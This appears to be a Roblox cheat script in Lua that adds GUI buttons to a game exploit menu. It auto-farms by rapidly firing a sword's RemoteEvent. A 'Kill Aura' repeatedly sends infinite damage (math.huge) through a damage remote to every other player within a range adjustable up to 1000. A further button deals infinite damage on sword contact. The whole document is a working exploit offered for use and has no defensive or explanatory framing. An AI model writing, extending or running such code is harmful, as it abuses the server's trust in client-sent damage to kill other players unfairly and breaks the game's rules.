-- Helper: Fire sword remote
local function fireSword(times)
    local player = game.Players.LocalPlayer
    if not player then return end
    local character = player.Character or player.CharacterAdded:Wait()
    local sword = character:FindFirstChild("sword") or player.Backpack:FindFirstChild("sword")
    if not sword then return end
    local handle = sword:FindFirstChild("Handle")
    if not handle then return end
    local up = handle:FindFirstChild("up")
    if not up then return end
    local remoteEvent = up:FindFirstChild("RemoteEvent")
    if not remoteEvent then return end
    for _ = 1, times do
        remoteEvent:FireServer()
        task.wait(0.05)
    end
end

-- Initialize globals to prevent auto-farming
_G.farm = false
_G.active = false
_G.fastFarmConnection = nil

-- Farming Buttons
if main and type(main.Button) == "function" then
    main:Button("Slow Farm", function()
        _G.farm = true
        task.spawn(function()
            while _G.farm do
                fireSword(4)
                task.wait()
            end
        end)
    end)
    
    main:Button("Fast Farm", function()
        _G.active = true
        if not _G.fastFarmConnection then
            _G.fastFarmConnection = game:GetService("RunService").Stepped:Connect(function()
                if _G.active then
                    fireSword(6)
                end
            end)
        end
    end)
    
    main:Button("Unfast Farm", function()
        _G.active = false
    end)
    
    main:Button("Unslow Farm", function()
        _G.farm = false
    end)
end

-- Kill Aura Button
if main and type(main.Button) == "function" then
    main:Button("Kill Aura", function()
        if main.KillAuraInitialized then return end
        main.KillAuraInitialized = true
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local UserInputService = game:GetService("UserInputService")
        local player = Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local backpack = player:WaitForChild("Backpack")
        local killAuraActive = true
        local range = 40
        local activeSword, dmgRemote
        main:Slider("Kill Aura Range", 10, 1000, range, function(newRange) range = newRange end)
        local function findValidSword(container)
            for _, tool in pairs(container:GetChildren()) do
                if tool:IsA("Tool") and tool:FindFirstChild("Handle") and tool.Handle:FindFirstChild("dmg") then
                    return tool
                end
            end
            return nil
        end
        local function setupSword()
            local sword = findValidSword(backpack) or findValidSword(character)
            if sword then
                sword.Parent = backpack
                sword.Handle.Massless = true
                sword.Handle.CanCollide = true
                sword.Parent = character
                task.wait(0.2)
                activeSword = sword
                dmgRemote = sword.Handle.dmg:FindFirstChild("RemoteEvent")
            end
        end
        setupSword()
        RunService.RenderStepped:Connect(function()
            if not killAuraActive or not activeSword or not dmgRemote then return end
            local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            for _, target in ipairs(Players:GetPlayers()) do
                if target ~= player and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                    local targetHRP = target.Character.HumanoidRootPart
                    local distance = (hrp.Position - targetHRP.Position).Magnitude
                    if distance <= range then
                        local targetHumanoid = target.Character:FindFirstChild("Humanoid")
                        if targetHumanoid then
                            dmgRemote:FireServer(targetHumanoid, math.huge)
                        end
                    end
                end
            end
        end)
        UserInputService.InputBegan:Connect(function(input, gameProcessed)
            if gameProcessed then return end
            if input.KeyCode == Enum.KeyCode.E then
                killAuraActive = not killAuraActive
            end
        end)
    end)
end

-- Sword Damage Script Button
if main and type(main.Button) == "function" then
    main:Button("Sword Damage Script", function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local backpack = player.Backpack
        local function getSwords()
            local swords = {}
            for _, container in ipairs({backpack, character}) do
                for _, tool in ipairs(container:GetChildren()) do
                    if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
                        table.insert(swords, tool)
                    end
                end
            end
            return swords
        end
        for _, sword in ipairs(getSwords()) do
            sword.Parent = backpack
            sword.Handle.Massless = true
            sword.Handle.CanCollide = true
            sword.Parent = character
            sword.Handle.Touched:Connect(function(hit)
                local targetHumanoid = hit.Parent and hit.Parent:FindFirstChild("Humanoid")
                if targetHumanoid and hit.Parent.Name ~= player.Name then
                    local dmg = sword.Handle:FindFirstChild("dmg")
                    if dmg then
                        local remoteEvent = dmg:FindFirstChild("RemoteEvent")
                        if remoteEvent then
                            remoteEvent:FireServer(targetHumanoid, math.huge)
                        end
                    end
                end
            end)
        end
    end)
end

